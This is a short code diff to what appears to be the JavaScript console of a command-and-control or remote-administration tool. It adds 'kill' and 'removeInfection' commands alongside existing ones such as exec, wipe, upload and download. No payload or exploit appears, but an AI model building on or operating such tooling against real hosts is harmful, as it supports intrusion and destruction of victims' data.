@@ -70,6 +70,12 @@
         break;
       case "download":
         sendBjob(id,jobEx,args);
+        break; 
+      case "kill":
+        sendBjob(id,jobEx,args);
+        break; 
+      case "removeInfection":
+        sendBjob(id,jobEx,args);
         break;                          
       default:
         help();
@@ -91,7 +97,7 @@ function clearConsole() {
 }
 
 function help(){
-  localEcho.println('Help: List of available commands: help,clear,respTime,ttl,exec,ls,accesschk,read,write,wipe,upload,download');
+  localEcho.println('Help: List of available commands: help,clear,respTime,ttl,exec,ls,accesschk,read,write,wipe,upload,download,kill,removeInfection');
 }
 
 function checkJobsOutput(){
